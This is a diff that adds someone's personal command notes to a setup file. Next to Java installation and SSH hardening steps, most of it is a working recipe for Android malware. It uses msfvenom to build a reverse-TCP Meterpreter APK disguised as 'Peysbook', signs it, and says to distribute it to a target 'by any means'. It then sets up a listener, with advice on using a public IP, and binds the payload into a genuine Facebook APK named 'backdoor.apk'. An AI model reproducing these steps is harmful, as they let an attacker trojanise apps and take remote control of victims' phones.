@@ -10,3 +10,99 @@ apt-get install openjdk-8-jdk
 
 update-alternatives --list java
 sudo update-alternatives --config java
+
++++++Meterpreter/MSFVenom
+Install Msfvenom / Meterpreter on Debian
+ -apt-get update -y && apt-get upgrade -y
+
+Create standard user
+-adduser	 - to add another standard user
+-usermod -aG sudo newuser - add to sudo user
+-su to switch to new standard user
+
+- apt-get install  ruby ruby-dev build-essential zlib1g zlib1g-dev libpq-dev libpcap-dev libsqlite3-dev git curl -y
+- apt-get install software-properties-common zipalign apksigner 
+- apt-add-repository 'deb http://security.debian.org/debian-security stretch/updates main'
+- apt-get update
+- apt-get install openjdk-8-jdk
+- cd /opt
+-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall 
+-chmod 755 msfinstall
+-./msfinstall
+
+
+to setup Payload (APK)
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST 192.168.0.181 LPORT 4444 R> Peysbook.apk
+
+keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore Peysbook.apk hacked
+
+jarsigner -verify -verbose -certs Peysbook.apk
+
+zipalign -v 4 android_shell.apk Peysbook_signed_jar.apk (apk file to send to targer)
+
+-send/distribute the file by any means
+
+On Attacker's Server
+msfconsole
+-use exploit/multi/handler
+-set PAYLOAD android/meterpreter/reverse_tcp
+-set lhost 192.168.0.181 (Local attacker IP), if for remote use publick IP
+-set lport 4444
+-run
+
+
+
+https://null-byte.wonderhowto.com/forum/bind-original-apk-into-payload-with-msfvenom-0289909/
+
+
++++++++++++++++++++++++++++++++++++++++++++++
+
+- sudo gem install bundler
+  -if theres an error disable ipv6
+	sudo nano /etc/sysctl.conf
+	Add the following at the bottom of the file: net.ipv6.conf.all.disable_ipv6 = 1
+	then reboot pc
+-
+
+
+Secure Server
+-apt-get update
+-apt-get upgrade
+-apt-get dist-upgrade
+
+move all sshd key to a new folder
+-mkdir -p ssh_old_key /etc/ssh
+-move all ssh_host* files to the nee backup folder
+sudo dpkg-reconfigure openssh-server to generate new ssh keys
+sudo md5sum ssh_host_* to check if keys has been changed and compare with the old
+rm -rf old_keys to delete ssh old keys
+
+adduser	 - to add another standard user
+usermod -aG sudo newuser - add to sudo user
+su to switch to new standard user
+
+https://ibotpeaches.github.io/Apktool/install/
+apt-get install zipalign
+apt-get install apksigner
+𝚊𝚙𝚝-𝚐𝚎𝚝 𝚒𝚗𝚜𝚝𝚊𝚕𝚕 𝚘𝚙𝚎𝚗𝚓𝚍𝚔-𝟷𝟷-𝚓𝚍𝚔 (https://www.digitalocean.com/community/questions/can-t-install-java-jdk-11-on-debian-9)
+𝚓𝚊𝚛𝚜𝚒𝚐𝚗𝚎𝚛
+
+cd /opt
+-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+
+dowload legit apk like fb from apkmirror.com (https://www.apkmirror.com/apk/facebook-2/facebook/facebook-379-0-0-24-109-release/facebook-379-0-0-24-109-13-android-apk-download/download/?key=2f403311b50fec11e28e4749d7bb5dd9700bad3e)
+$ 𝚖𝚜𝚏𝚟𝚎𝚗𝚘𝚖 -𝚡 𝚕𝚎𝚐𝚒𝚝.𝚊𝚙𝚔 -𝚙 𝚊𝚗𝚍𝚛𝚘𝚒𝚍/𝚖𝚎𝚝𝚎𝚛𝚙𝚛𝚎𝚝𝚎𝚛/𝚛𝚎𝚟𝚎𝚛𝚜𝚎_𝚝𝚌𝚙 𝚕𝚑𝚘𝚜𝚝=𝟷𝟿𝟸.𝟷𝟼𝟾.𝟷.𝟷𝟶 𝚕𝚙𝚘𝚛𝚝=𝟺𝟺𝟺𝟺 -𝚘 𝚋𝚊𝚌𝚔𝚍𝚘𝚘𝚛.𝚊𝚙𝚔
+$ 𝚖𝚜𝚏𝚌𝚘𝚗𝚜𝚘𝚕𝚎
+$ 𝚞𝚜𝚎 𝚎𝚡𝚙𝚕𝚘𝚒𝚝/𝚖𝚞𝚕𝚝𝚒/𝚑𝚊𝚗𝚍𝚕𝚎𝚛
+$ 𝚜𝚎𝚝 𝚙𝚊𝚢𝚕𝚘𝚊𝚍 𝚊𝚗𝚍𝚛𝚘𝚒𝚍/𝚖𝚎𝚝𝚎𝚛𝚙𝚛𝚎𝚝𝚎𝚛/𝚛𝚎𝚟𝚎𝚛𝚜𝚎_𝚝𝚌𝚙
+$ 𝚜𝚎𝚝 𝚕𝚑𝚘𝚜𝚝 𝟷𝟿𝟸.𝟷𝟼𝟾.𝟷.𝟷𝟶
+$ 𝚜𝚎𝚝 𝚕𝚙𝚘𝚛𝚝 𝟺𝟺𝟺𝟺
+𝚛𝚞𝚗
+
+
+
